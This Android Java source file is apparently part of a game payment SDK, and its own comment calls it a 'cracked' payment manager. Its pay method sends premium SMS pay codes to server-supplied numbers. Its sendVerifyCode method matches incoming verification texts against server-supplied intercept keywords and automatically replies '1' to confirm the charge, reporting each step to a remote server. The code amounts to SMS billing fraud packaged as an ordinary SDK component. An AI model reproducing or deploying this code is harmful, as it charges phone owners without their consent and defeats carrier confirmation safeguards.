package mobi.zty.pay.sdk.dongfeng;

import java.util.List;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.GroupFeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.StringUtil;
import mobi.zty.sdk.util.Util_G;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;

/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class DongFengFeeInstance extends PaymentInterf{
	private static DongFengFeeInstance instance;
	private Handler callBHandler = null;
	private Context context;
	public static DongFengFeeInstance getInstance(){
		if(instance==null){
			instance = scyDFpay();
		}
		return instance;
	}
	private static synchronized DongFengFeeInstance scyDFpay(){
		if(instance==null){
			instance =  new DongFengFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		this.context = context;
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String ext = (String) parameters[0];
		int feeIndex = (Integer) parameters[1];
		Helper.sendPayMessageToServer(PayConfig.DONGFENG_PAY, "进入支付：", feeIndex);
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		
		final String payCode = feeInfo.payCode;
		final String send_num = mkInfo.sendNum;
		
		String sms_content = payCode;
		if (!payCode.contains("nc8")) {
			sms_content += ext;
		}
//		Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
//		itSend.putExtra("fee_index", feeIndex);
//		context.sendBroadcast(itSend);
		Helper.sendPayMessageToServer(PayConfig.DONGFENG_PAY, "执行支付并发送短信：send_num="
		+send_num+ "sms_content="+sms_content, feeIndex);
		Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
		itSend.putExtra("fee_index", feeIndex);
        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
        Util_G.sendTextMessage(context, send_num, sms_content, mSendPI, 0);
        Util_G.debugE("dongfeng_pay", "dongfeng_data->"+sms_content);
	}
	
	@Override
	public void sendVerifyCode(Object... parameters) {
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		int feeIndex = (Integer) parameters[2];
		Helper.sendPayMessageToServer(PayConfig.DONGFENG_PAY, "读取到验证码短信"+content, feeIndex);
		GameSDK instance = GameSDK.getInstance();
		GroupFeeInfo groupFeeInfo = instance.getCurgGroupFeeInfo();
		if (groupFeeInfo == null)  return;
		
		List<String> interceptContents = instance.mkMap.get(PayConfig.DONGFENG_PAY).interceptContents;
		if (interceptContents.size()==0) {//没有要拦截的内容  这个和东风支付  获取验证码规则不符合  不执行验证码回复
			Util_G.debugE("ALLPAY","error 后台未给客户端东风的 拦截内容");
			Helper.sendPayMessageToServer(PayConfig.DONGFENG_PAY, "后台未给客户端东风的 拦截内容", feeIndex);
		}else{
			boolean canIntercept = true;
			for (int i = 0; i < interceptContents.size(); i++) {
				if (!content.contains(interceptContents.get(i))) {
					canIntercept = false;
					Helper.sendPayMessageToServer(PayConfig.DONGFENG_PAY, "改短信不是验证短信！", feeIndex);
					break;
				}
			}
			if (canIntercept) {
				groupFeeInfo.getIntdexVerifyMap().put(feeIndex, 2);
				Intent itSend = new Intent(Constants.SENT_SMS_ACTION);
				itSend.putExtra("fee_index", feeIndex);
				PendingIntent mSendPI = PendingIntent.getBroadcast(
						context.getApplicationContext(), 0, itSend,
						PendingIntent.FLAG_ONE_SHOT);// 这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。
				Util_G.sendTextMessage(context, sendFrom, "1", mSendPI, 0);
				Util_G.debugE("DONGFENG", "DONGFENG_PAY_验证码确认短信"+sendFrom);
				Helper.sendPayMessageToServer(PayConfig.DONGFENG_PAY, "回复验证码", feeIndex);
			}
		}
	}
}
